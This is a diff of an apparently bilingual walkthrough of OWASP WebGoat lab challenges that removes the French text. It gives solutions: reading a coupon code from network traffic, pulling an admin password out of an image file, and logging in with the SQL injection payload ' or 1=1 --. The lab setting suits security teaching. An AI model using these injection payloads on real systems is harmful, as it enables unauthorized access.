 ![Client Side Filtering 2](images/wiki_owasp_webgoat/client-side-filtering-2.png)
 
@@ -1064,26 +1176,27 @@ Suivre les instructions. Follow the instructions.
 ![Hint](images/wiki_owasp_webgoat/hint.png) Try to see the flow of request from the page to the backen  
 ![Hint](images/wiki_owasp_webgoat/hint.png) client.side.filtering.free.hint3
 
-*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Réseau_. Open the _Development Tools_ in the browser, and go to the _Network_ tab.
-*   Sur WebGoat, cliquer sur la case **CHECKOUT CODE** sans rentrer d'informations, puis sur cliquer sur **Chekout**. On **WebGoat** click on the **CHECKOUT CODE** case then click on **Chekout** without editing the parameters.
-*   Repérer la requête vers `coupons` dans l'onglet _Réseau_ et cliquer sur _Réponse_. Locate the query to `coupons` in the _Network_ tab and click on _Response_.
-*   Remarquer le code `get_it_for_free` permettant d'obtenir un _discount_ de 100%. Notice the `get_it_for_free` code to get a discount of 100%.
+*   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
+*   On **WebGoat** click on the **CHECKOUT CODE** case then click on **Chekout** without editing the parameters.
+*   Locate the query to `coupons` in the _Network_ tab and click on _Response_.
+*   Notice the `get_it_for_free` code to get a discount of 100%.
 
 #### **Challenges:**
 
 ##### Admin lost password
 
-*   Télécharger l'image http://host:port/WebGoat/images/webgoat2.png . Download the image http://host:port/WebGoat/images/webgoat2.png .
-*   L'ouvrir dans un éditeur de texte. Open it in a text editor.
-*   Rechercher la chaine de caratères **admin** pour tomber sur le mot de passe **!!webgoat\_admin\_1234!!**. Look up for the string **admin** to find the password **!!webgoat\_admin\_1234!!**.
+*   Download the image http://host:port/WebGoat/images/webgoat2.png.
+*   Open it in a text editor.
+*   Look up for the string **admin** to find the password **!!webgoat\_admin\_1234!!**.
 
 ##### Without password
 
-Username: **Larry** Password: **' or 1=1 --**
+*   **Username**: `Larry`
+*   **Password**: `' or 1=1 --`
 
 ##### Creating a new account
 
-Ce challenge est exactement le même que celui de **(A1) Injection** - SQL Injection (advanced) 5. This challenge is exactly the same as **(A1) Injection** - SQL Injection (advanced) 5.
+This challenge is exactly the same as **(A1) Injection** - SQL Injection (advanced) 5.
 
 ##### Admin password reset
 
